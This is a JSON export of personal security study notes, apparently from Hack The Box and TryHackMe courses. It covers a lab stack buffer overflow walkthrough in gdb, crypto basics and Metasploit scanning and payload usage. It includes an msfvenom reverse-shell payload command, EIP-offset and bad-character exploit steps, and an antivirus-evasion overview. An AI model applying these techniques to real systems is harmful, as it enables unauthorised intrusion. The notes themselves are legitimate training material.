'Aa0Aa1Aa2Aa3Aa4Aa5...\u003cSNIP\u003e...Bn6Bn7Bn8Bn9'\") \n\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/student/bow/bow32 $(python -c \"print 'Aa0Aa1Aa2Aa3Aa4Aa5...\u003cSNIP\u003e...Bn6Bn7Bn8Bn9'\")\nProgram received signal SIGSEGV, Segmentation fault.\n0x69423569 in ?? ()\n```\n\n```\n(gdb) info registers eip\n\neip            0x694235690x69423569\n```\n\nWe see that the `EIP` displays a different memory address, and we can use another MSF tool called \"`pattern_offset`\" to calculate the exact number of characters (offset) needed to advance to the `EIP`.\n\n- Offset:\n\n```\nPietra@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569\n\n[*] Exact match at offset 1036\n```\n\n\n![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png)\n\nIf we now use precisely this number of bytes for our \"`U`\"s, we should land exactly on the `EIP`. To overwrite it and check if we have reached it as planned, we can add 4 more bytes with \"`\\x66`\" and execute it to ensure we control the `EIP`.\n\n```\n(gdb) run $(python -c \"print '\\x55' * 1036 + '\\x66' * 4\")\n\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/student/bow/bow32 $(python -c \"print '\\x55' * 1036 + '\\x66' * 4\")\nProgram received signal SIGSEGV, Segmentation fault.\n0x66666666 in ?? ()\n```\n\n![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png)\n\nNow we see that we have overwritten the `EIP` with our \"`\\x66`\" characters. Next, we have to find out how much space we have for our shellcode, which then executes the commands we intend. As we control the `EIP` now, we will later overwrite it with the address pointing to our shellcode's beginning.\n\n## Determine Length for Shellcode\n```bash\nPietra@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c\n\nNo encoder or badchars specified, outputting raw payload\nPayload size: 68 bytes\n\u003cSNIP\u003e\n```\n\nWe now know that our payload will be about 68 bytes. However we should try to take a larger range in case the shellcode increases.\n\nWe can insert some **no operation instruction** (**NOPS**) before our shellcode begins so it can be executed cleanly. We need:\n\n1. Total of 1040 bytes to get to the **EIP**.\n2. Additional **100 bytes** of **NOPS**.\n3. **150 bytes** for our **shellcode**.\n\n```bash\nBuffer = \"\\x55\" * (1040 - 100 - 150 - 4) = 786\nNOPs = \"\\x90\" * 100\nShellcode = \"\\x44\" * 150\nEIP = \"\\x66\" * 4'\n```\n\n![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png)\n\n```bash\n(gdb) run $(python -c 'print \"\\x55\" * (1040 - 100 - 150 - 4) + \"\\x90\" * 100 + \"\\x44\" * 150 + \"\\x66\" * 4')\n\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/student/bow/bow32 $(python -c 'print \"\\x55\" * (1040 - 100 - 150 - 4) + \"\\x90\" * 100 + \"\\x44\" * 150 + \"\\x66\" * 4')\nProgram received signal SIGSEGV, Segmentation fault.\n0x66666666 in ?? ()\n```\n\n![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png)\n\n## Identification of Bad Characters\nUNIX-like operating systems used to start with two bytes containing a \"**magic number**\" that determines the file type.\n\nThey could be:\n- `\\00` - Null Byte\n- `\\0A` - Line Feed\n- `\\0D` - Carriage Return\n- `\\FF` - Form Feed\n\n- We can set a character list:\n\n```bash\nPietra@htb[/htb]$ CHARS=\"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n```\n\n- Calculate length:\n\n```bash\nPietra@htb[/htb]$ echo $CHARS | sed 's/\\\\x/ /g' | wc -w\n\n256\n```\n\nTherefore:\n\n```bash\nBuffer = \"\\x55\" * (1040 - 256 - 4) = 780\nCHARS = \"\\x00\\x01\\x02\\x03\\x04\\x05...\u003cSNIP\u003e...\\xfd\\xfe\\xff\"\nEIP = \"\\x66\" * 4\n```\n\nIn our `bow` example, we have to set a breakpoint at the main function so we can analyse the memory content and then send the payload:\n\n```bash\n(gdb) break bowfunc \n\nBreakpoint 1 at 0x56555551\n```\n\n```bash\n(gdb) run $(python -c 'print \"\\x55\" * (1040 - 256 - 4) + \"\\x00\\x01\\x02\\x03\\x04\\x05...\u003cSNIP\u003e...\\xfc\\xfd\\xfe\\xff\" + \"\\x66\" * 4')\n\nStarting program: /home/student/bow/bow32 $(python -c 'print \"\\x55\" * (1040 - 256 - 4) + \"\\x00\\x01\\x02\\x03\\x04\\x05...\u003cSNIP\u003e...\\xfc\\xfd\\xfe\\xff\" + \"\\x66\" * 4')\n/bin/bash: warning: command substitution: ignored null byte in input\n\nBreakpoint 1, 0x56555551 in bowfunc ()\n```\n\nNow we can look at the stack:\n\n```bash\n(gdb) x/2000xb $esp+500\n\n0xffffd28a:\t0xbb\t0x69\t0x36\t0x38\t0x36\t0x00\t0x00\t0x00\n0xffffd292:\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00\n0xffffd29a:\t0x00\t0x2f\t0x68\t0x6f\t0x6d\t0x65\t0x2f\t0x73\n0xffffd2a2:\t0x74\t0x75\t0x64\t0x65\t0x6e\t0x74\t0x2f\t0x62\n0xffffd2aa:\t0x6f\t0x77\t0x2f\t0x62\t0x6f\t0x77\t0x33\t0x32\n0xffffd2b2:\t0x00    0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\n\t\t\t\t # |---\u003e \"\\x55\"s begin\n\n0xffffd2ba: 0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\n0xffffd2c2: 0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\n\u003cSNIP\u003e\n```\n\nHere we can see at which address \"`\\x55`\" starts. From here we can go further down and look for the place where `CHARS` start:\n\n```bash\n\u003cSNIP\u003e\n0xffffd5aa:\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\n0xffffd5b2:\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\n0xffffd5ba:\t0x55\t0x55\t0x55\t0x55\t0x55\t0x01\t0x02\t0x03\n\t\t\t\t\t\t\t\t\t\t\t\t # |---\u003e CHARS begin\n\n0xffffd5c2:\t0x04\t0x05\t0x06\t0x07\t0x08\t0x00\t0x0b\t0x0c\n0xffffd5ca:\t0x0d\t0x0e\t0x0f\t0x10\t0x11\t0x12\t0x13\t0x14\n0xffffd5d2:\t0x15\t0x16\t0x17\t0x18\t0x19\t0x1a\t0x1b\t0x1c\n\u003cSNIP\u003e\n```\n\nWe see where our \"`\\x55`\" ends, and the `CHARS` variable begins. But if we look closely at it, we will see that it starts with \"`\\x01`\" instead of \"`\\x00`\". We have already seen the warning during the execution that the `null byte` in our input was ignored.\n\nSo we can note this character, remove it from our variable `CHARS` and adjust the number of our \"`\\x55`\".\n\n```bash\n# Substract the number of removed characters\nBuffer = \"\\x55\" * (1040 - 255 - 4) = 781\n\n# \"\\x00\" removed: 256 - 1 = 255 bytes\nCHARS = \"\\x01\\x02\\x03...\u003cSNIP\u003e...\\xfd\\xfe\\xff\"\n \nEIP = \"\\x66\" * 4\n```\n\nNow we send without null bytes:\n\n```bash\n(gdb) run $(python -c 'print \"\\x55\" * (1040 - 255 - 4) + \"\\x01\\x02\\x03\\x04\\x05...\u003cSNIP\u003e...\\xfc\\xfd\\xfe\\xff\" + \"\\x66\" * 4')\n\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/student/bow/bow32 $(python -c 'print \"\\x55\" * (1040 - 255 - 4) + \"\\x01\\x02\\x03\\x04\\x05...\u003cSNIP\u003e...\\xfc\\xfd\\xfe\\xff\" + \"\\x66\" * 4')\nBreakpoint 1, 0x56555551 in bowfunc ()\n```\n\nAnd the stack:\n```shell-session\n(gdb) x/2000xb $esp+550\n\n\u003cSNIP\u003e\n0xffffd5ba:\t0x55\t0x55\t0x55\t0x55\t0x55\t0x01\t0x02\t0x03\n0xffffd5c2:\t0x04\t0x05\t0x06\t0x07\t0x08\t0x00\t0x0b\t0x0c\n\t\t\t\t\t\t\t\t\t\t\t\t # |----| \u003c- \"\\x09\" expected\n\n0xffffd5ca:\t0x0d\t0x0e\t0x0f\t0x10\t0x11\t0x12\t0x13\t0x14\n\u003cSNIP\u003e\n```\n\nHere it depends on our bytes' correct order in the variable `CHARS` to see if any character changes, interrupts, or skips the order. Now we recognize that after the \"`\\x08`\", we encounter the \"`\\x00`\" instead of the \"`\\x09`\" as expected. This tells us that this character is not allowed here and must be removed accordingly:\n\n```bash\n# Substract the number of removed characters\nBuffer = \"\\x55\" * (1040 - 254 - 4) = 782\t\n\n# \"\\x00\" \u0026 \"\\x09\" removed: 256 - 2 = 254 bytes\n CHARS = \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x0a\\x0b...\u003cSNIP\u003e...\\xfd\\xfe\\xff\" \n \n   EIP = \"\\x66\" * 4\n```\n\nWe send:\n\n```bash\n(gdb) run $(python -c 'print \"\\x55\" * (1040 - 254 - 4) + \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x0a\\x0b...\u003cSNIP\u003e...\\xfc\\xfd\\xfe\\xff\" + \"\\x66\" * 4')\n\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/student/bow/bow32 $(python -c 'print \"\\x55\" * (1040 - 254 - 4) + \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x0a\\x0b...\u003cSNIP\u003e...\\xfc\\xfd\\xfe\\xff\" + \"\\x66\" * 4')\nBreakpoint 1, 0x56555551 in bowfunc ()\n```\n\nThe stack:\n\n```bash\n(gdb) x/2000xb $esp+550\n\n\u003cSNIP\u003e\n0xffffd5ba:\t0x55\t0x55\t0x55\t0x55\t0x55\t0x01\t0x02\t0x03\n0xffffd5c2:\t0x04\t0x05\t0x06\t0x07\t0x08\t0x00\t0x0b\t0x0c\n\t\t\t\t\t\t\t\t\t\t\t\t # |----| \u003c- \"\\x0a\" expected\n\n0xffffd5ca:\t0x0d\t0x0e\t0x0f\t0x10\t0x11\t0x12\t0x13\t0x14\n\u003cSNIP\u003e\n```\n\nTo find stack size, for example the size after overwritting:\n\n```bash\n(gdb) info proc all\n```\n",
    "lastmodified": "2022-11-24T12:21:01.568919659Z",
    "tags": null
  },
  "/notes/general/task-hub": {
    "title": "Task Hub",
    "content": "# Tasks\n---\n## For Today\n```tasks\nnot done\ndue today\n```\n\n## Available Tasks\n```tasks\nnot done\npath does not include private/\n```\n\n## Completed\n```tasks\ndone\n```\n\n",
    "lastmodified": "2022-11-24T12:21:01.597101331Z",
    "tags": null
  },
  "/notes/general/thm-encryption101": {
    "title": "TryHackMe - Encryption 101",
    "content": "# Encryption - Crypto 101\n**Ciphertext** - The result of encrypting a plain text, encrypted data\n\n**Cipher** - A method of encrypting or decrypting data. Modern ciphers are cryptographic, but there are many non cryptographic ciphers like Caesar.\n\n**Plaintext** - Data before encryption, often text but not always. Could be a photograph or other file\n\n**Encryption** - Transforming data into ciphertext, using a cipher.\n\n**Encoding** - NOT a form of encryption, just a form of data representation like base64. Immediately reversible.\n\n**Key** - Some information that is needed to correctly decrypt the ciphertext and obtain the plaintext.\n\n**Passphrase** \\- Separate to the key, a passphrase is similar to a password and used to protect a key.\n\n**Asymmetric encryption** - Uses different keys to encrypt and decrypt.\n\n**Symmetric encryption** - Uses the same key to encrypt and decrypt\n\n**Brute force** - Attacking cryptography by trying every different password or every different key\n\n**Cryptanalysis** - Attacking cryptography by finding a weakness in the underlying maths\n\n**Alice and Bob** - Used to represent 2 people who generally want to communicate. They’re named Alice and Bob because this gives them the initials A and B. \n\n## Why is encryption important?\nCryptography is used to protect confidentiality, ensure integrity, ensure authenticity. You use cryptography every day most likely, and you’re almost certainly reading this now over an encrypted connection.\n\nWhen logging into TryHackMe, your credentials were sent to the server. These were encrypted, otherwise someone would be able to capture them by snooping on your connection.\n\nWhen you connect to SSH, your client and the server establish an encrypted tunnel so that no one can snoop on your session.\n\nWhen you connect to your bank, there’s a certificate that uses cryptography to prove that it is actually your bank rather than a hacker.\n\nWhen you download a file, how do you check if it downloaded right? You can use cryptography here to verify a checksum of the data.\n\nYou rarely have to interact directly with cryptography, but it silently protects almost everything you do digitally.\n\nWhenever sensitive user data needs to be stored, it should be encrypted. Standards like [PCI-DSS](https://www.pcisecuritystandards.org/documents/PCI_DSS_for_Large_Organizations_v1.pdf) state that the data should be encrypted both at rest (in storage) AND while being transmitted. If you’re handling payment card details, you need to comply with these PCI regulations. Medical data has similar standards. With legislation like GDPR and California’s data protection, data breaches are extremely costly and dangerous to you as either a consumer or a business.\n\n**DO NOT** encrypt passwords unless you’re doing something like a password manager. Passwords should not be stored in plain text, and you should use hashing to manage them safely.\n\n## RSA\n### The math(s) side\nRSA is based on the mathematically difficult problem of working out the factors of a large number. It’s very quick to multiply two prime numbers together, say 17\\*23 = 391, but it’s quite difficult to work out what two prime numbers multiply together to make 14351 (113x127 for reference).\n\n### The attacking side\nThe maths behind RSA seems to come up relatively often in CTFs, normally requiring you to calculate variables or break some encryption based on them. The wikipedia page for RSA seems complicated at first, but will give you almost all of the information you need in order to complete challenges.\n\nThere are some excellent tools for defeating RSA challenges in CTFs, and my personal favorite is [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) which has worked very well for me. I’ve also had some success with [https://github.com/ius/rsatool](https://github.com/ius/rsatool).\n\nThe key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.\n\n“p” and “q” are large prime numbers, “n” is the product of p and q.\n\nThe public key is n and e, the private key is n and d.\n\n“m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).\n\n### CTFs involving RSA\nCrypto CTF challenges often present you with a set of these values, and you need to break the encryption and decrypt a message to retrieve the flag.\n\nThere’s a lot more maths to RSA, and it gets quite complicated fairly quickly. If you want to learn the maths behind it, I recommend reading MuirlandOracle’s blog post here: [https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/).\n\n## Establishing Keys Using Asymmetric Cryptography\n### Metaphor time\nImagine you have a secret code, and instructions for how to use the secret code. If you want to send your friend the instructions without anyone else being able to read it, what you could do is ask your friend for a lock.\n\nOnly they have the key for this lock, and we’ll assume you have an indestructible box that you can lock with it.\n\nIf you send the instructions in a locked box to your friend, they can unlock it once it reaches them and read the instructions.\n\nAfter that, you can communicate in the secret code without risk of people snooping.\n\nIn this metaphor, the secret code represents a symmetric encryption key, the lock represents the server’s public key, and the key represents the server’s private key.\n\nYou’ve only used asymmetric cryptography once, so it’s fast, and you can now communicate privately with symmetric encryption.\n\n### The Real World\nIn reality, you need a little more cryptography to verify the person you’re talking to is who they say they are, which is done using digital signatures and certificates. You can find a lot more detail on how HTTPS (one example where you need to exchange keys) really works from this excellent blog post. [https://robertheaton.com/2014/03/27/how-does-https-actually-work/](https://robertheaton.com/2014/03/27/how-does-https-actually-work/)\n## Digital Signatures and Certificates\n### What's a Digital Signature?\nDigital signatures are a way to prove the authenticity of files, to prove who created or modified them. Using asymmetric cryptography, you produce a signature with your private key and it can be verified using your public key. As only you should have access to your private key, this proves you signed the file. Digital signatures and physical signatures have the same value in the UK, legally.\n\nThe simplest form of digital signature would be encrypting the document with your private key, and then if someone wanted to verify this signature they would decrypt it with your public key and check if the files match.\n\n### Certificates - Prove who you are!\nCertificates are also a key use of public key cryptography, linked to digital signatures. A common place where they’re used is for HTTPS. How does your web browser know that the server you’re talking to is the real tryhackme.com?\n\nThe answer is certificates. The web server has a certificate that says it is the real tryhackme.com. The certificates have a chain of trust, starting with a root CA (certificate authority). Root CAs are automatically trusted by your device, OS, or browser from install. Certs below that are trusted because the Root CAs say they trust that organisation. Certificates below that are trusted because the organisation is trusted by the Root CA and so on. There are long chains of trust. Again, this blog post explains this much better than I can. [https://robertheaton.com/2014/03/27/how-does-https-actually-work/](https://robertheaton.com/2014/03/27/how-does-https-actually-work/)\n\nYou can get your own HTTPS certificates for domains you own using Let’s Encrypt for free. If you run a website, it’s worth setting it up.\n\n## Cracking SSH ID_RSA\nhttps://vk9-sec.com/ssh2john-how-to/\n\n## PGP, GPG and AES\n### What is PGP?\nPGP stands for Pretty Good Privacy. It’s a software that implements encryption for encrypting files, performing digital signing and more.\n\n### What is GPG?\n[GnuPG or GPG](https://gnupg.org/) is an Open Source implementation of PGP from the GNU project. You may need to use GPG to decrypt files in CTFs. With PGP/GPG, private keys can be protected with passphrases in a similar way to SSH private keys. If the key is passphrase protected, you can attempt to crack this passphrase using John The Ripper and gpg2john. The key provided in this task is not protected with a passphrase.\n\nThe man page for GPG can be found online [here](https://www.gnupg.org/gph/de/manual/r1023.html).\n\n### What about AES?\nAES, sometimes called Rijndael after its creators, stands for Advanced Encryption Standard. It was a replacement for DES which had short keys and other cryptographic flaws.\n\nAES and DES both operate on blocks of data (a block is a fixed size series of bits).\n\nAES is complicated to explain, and doesn’t seem to come up as often. If you’d like to learn how it works, here’s an excellent video from Computerphile [https://www.youtube.com/watch?v=O4xNJsjtN6E](https://www.youtube.com/watch?v=O4xNJsjtN6E)",
    "lastmodified": "2022-11-24T12:21:01.683252335Z",
    "tags": null
  },
  "/notes/general/thm-metasploit": {
    "title": "TryHackMe - Metasploit",
    "content": "# Metasploit\n---\nDocs: https://docs.metasploit.com/\n\nMetasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.\n\nThe Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.\n\nThe main components of the Metasploit Framework can be summarised as follows;\n-   **msfconsole**: The main command-line interface.\n-   **Modules**: supporting modules such as exploits, scanners, payloads, etc.\n-   **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern\\_create and pattern\\_offset.\n\n## Main Components\n-   **Exploit:** A piece of code that uses a vulnerability present on the target system.\n-   **Vulnerability:** A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.\n-   **Payload:** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.\n\nModules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole).\n\n**Auxiliary**: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/aaeb4ff4aa7fc33289b2bb581d874f16.png)\n\n**Encoders**: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.\n\nSignature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.  \n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/814490c07d05616009169c80cbb173a5.png)\n\n**Evasion**: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.\n\nOn the other hand, “evasion” modules will try that, with more or less success.  \n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/fe66d8ad4c915fa496a20e6f6291a0ad.png)\n\n**Exploits**: Exploits, neatly organised by target system.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/b940db3ff6ec430322206f2e161114fc.png)\n\n**NOPs**: NOPs (No OPeration) do nothing, literally.\n\nThey are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/71c6dee3ef13c5bc841aac92ce3253d7.png)\n\n**Payloads**: Payloads are codes that will run on the target system.\n\nExploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.\n\nRunning command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a \"shell\". Metasploit offers the ability to send different payloads that can open shells on the target system.\n  \n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a4c9a90b50c7c46a6c8c1a5f78500ad1.png)\n\nYou will see three different directories under payloads: singles, stagers and stages.\n\n-   **Singles:** Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.\n-   **Stagers:** Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.\n-   **Stages:** Downloaded by the stager. This will allow you to use larger sized payloads.\n\nMetasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.\n\n-  `generic/shell\\_reverse\\_tcp`\n-   `windows/x64/shell/reverse\\_tcp`\n\nBoth are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “\\_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.\n\n**Post:** Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/fa98b51a9b3862dc43eb0d3007057290.png)\n\n## Exploit Ranking\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a88c8d37283878e01447853a68578deb.png)\n\n## Scanning\nTo port scan can use:\n\n```\n           msf6 \u003e search portscan\n\nMatching Modules\n================\n\n   #  Name                                              Disclosure Date  Rank    Check  Description\n   -  ----                                              ---------------  ----    -----  -----------\n   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator\n   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner\n   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner\n   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner\n   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner\n   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner\n   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP \"XMas\" Port Scanner\n   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner\n\n\nInteract with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner\n\nmsf6 \u003e\n        \n```\n\nPort scanning modules will require you to set a few options:\n\n```\n           msf6 auxiliary(scanner/portscan/tcp) \u003e show options\n\nModule options (auxiliary/scanner/portscan/tcp):\n\n   Name         Current Setting  Required  Description\n   ----         ---------------  --------  -----------\n   CONCURRENCY  10               yes       The number of concurrent ports to check per host\n   DELAY        0                yes       The delay between connections, per thread, in milliseconds\n   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.\n   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\n   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'\n   THREADS      1                yes       The number of concurrent threads (max one per host)\n   TIMEOUT      1000             yes       The socket connect timeout in milliseconds\n\nmsf6 auxiliary(scanner/portscan/tcp) \u003e\n        \n```\n\n-   **CONCURRENCY:** Number of targets to be scanned simultaneously.\n-   **PORTS:** Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.\n-   **RHOSTS:** Target or target network to be scanned.\n-   **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.\n\nYou can directly perform Nmap scans from the msfconsole prompt as shown below faster:  \n\nUsing Nmap from the Msfconsole prompt\n\n```\n           msf6 \u003e nmap -sS 10.10.12.229\n[*] exec: nmap -sS 10.10.12.229\n\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-20 03:54 BST\nNmap scan report for ip-10-10-12-229.eu-west-1.compute.internal (10.10.12.229)\nHost is up (0.0011s latency).\nNot shown: 992 closed ports\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3389/tcp  open  ms-wbt-server\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49158/tcp open  unknown\nMAC Address: 02:CE:59:27:C8:E3 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 64.19 seconds\nmsf6 \u003e\n        \n```\n\nAs for information gathering, if your engagement requires a speedier approach to port scanning, Metasploit may not be your first choice. However, a number of modules make Metasploit a useful tool for the scanning phase.\n\n### UDP service Identification\nThe `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.\n\n### UDP scan\n```\n           msf6 auxiliary(scanner/discovery/udp_sweep) \u003e run\n\n[*] Sending 13 probes to 10.10.12.229-\u003e10.10.12.229 (1 hosts)\n[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :JON-PC::U :WORKGROUP::G :WORKGROUP::U :__MSBROWSE__::G :02:ce:59:27:c8:e3)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/discovery/udp_sweep) \u003e\n        \n```\n\n### SMB Scans\nMetasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be `smb_enumshares` and `smb_version` but please spend some time to identify scanners that the Metasploit version installed on your system offers.\n\n```bash\n           msf6 auxiliary(scanner/smb/smb_version) \u003e run\n\n[+] 10.10.12.229:445      - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)\n[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/smb/smb_version) \u003e\n        \n```\n\nWhen performing service scans, it would be important not to omit more \"exotic\" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).\n\n## MsfVenom\nMsfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.  \n  \nMsfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).  \n\nMsfvenom payloads:\n\n```\n           root@ip-10-10-186-44:~# msfvenom -l payloads \n\nFramework Payloads (562 total) [--payload ]\n==================================================\n\n    Name                                                Description\n    ----                                                -----------\n    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell\n    